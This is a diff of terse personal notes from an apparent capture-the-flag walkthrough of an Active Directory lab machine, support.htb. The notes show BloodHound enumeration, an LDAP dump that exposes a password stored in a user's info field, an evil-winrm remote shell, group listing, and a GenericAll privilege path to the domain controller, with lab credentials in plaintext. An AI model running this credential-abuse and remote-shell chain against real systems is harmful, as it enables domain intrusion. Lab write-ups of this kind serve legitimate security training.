@@ -41,59 +41,117 @@ SMB         10.10.11.174    445    DC               NETLOGON        READ        
 SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
 SMB         10.10.11.174    445    DC               SYSVOL          READ            Logon server share 
 
-ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w "nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz" -b "DC=support,DC=htb"
+
+//run bloodhound
+└─$ bloodhound-python  -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174 -c All --zip -k 
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: support.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 21 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: puppetFakeComputer.support.htb
+INFO: Querying computer: Management.support.htb
+INFO: Querying computer: dc.support.htb
+WARNING: Could not resolve: puppetFakeComputer.support.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.174@53 answered The DNS operation timed out.
+INFO: Done in 00M 19S
+INFO: Compressing output into 20251127191503_bloodhound.zip
 
 
-# Shared Support Accounts, Users, support.htb
-dn: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+└─$ sudo bloodhound
+//nothing useful
 
-# ldap, Users, support.htb
-dn: CN=ldap,CN=Users,DC=support,DC=htb
+
+─$ ldapsearch -x -H ldap://support.htb -D ldap@support.htb -w "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -b "DC=support,DC=htb"
+
+# extended LDIF
+#
+# LDAPv3
+# base <DC=support,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
 
 # support, Users, support.htb
 dn: CN=support,CN=Users,DC=support,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: support
+c: US
+l: Chapel Hill
+st: NC
+postalCode: 27514
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+instanceType: 4
+whenCreated: 20220528111200.0Z
+whenChanged: 20251126121916.0Z
+uSNCreated: 12617
+info: Ironside47pleasure40Watchful
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 86082
+company: support
+streetAddress: Skipper Bowles Dr
+name: support
+objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132982099209777070
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
 
-# smith.rosario, Users, support.htb
-dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
+//seems a passwd for support, but cannot find it in blodhound, try evil-winrm
+─$ evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\support\Documents> whoami
+support\support
 
-# hernandez.stanley, Users, support.htb
-dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
 
-# wilson.shelby, Users, support.htb
-dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
 
-# anderson.damian, Users, support.htb
-dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
+//view the group search htegroups in bloodhound
+*Evil-WinRM* PS C:\Users\support\Desktop> whoami /groups
 
-# thomas.raphael, Users, support.htb
-dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
+GROUP INFORMATION
+-----------------
 
-# levine.leopoldo, Users, support.htb
-dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
-# raven.clifton, Users, support.htb
-dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
 
-# bardot.mary, Users, support.htb
-dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
-
-# cromwell.gerard, Users, support.htb
-dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
-
-# monroe.david, Users, support.htb
-dn: CN=monroe.david,CN=Users,DC=support,DC=htb
-
-# west.laura, Users, support.htb
-dn: CN=west.laura,CN=Users,DC=support,DC=htb
-
-# langley.lucy, Users, support.htb
-dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
-
-# daughtler.mabel, Users, support.htb
-dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
-
-# stoll.rachelle, Users, support.htb
-dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
-
-# ford.victoria, Users, support.htb
-dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
+bloodhound-python  -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.10.11.174 -c All --zip 
+//support is member of shared support with privi of generalAll to DC 
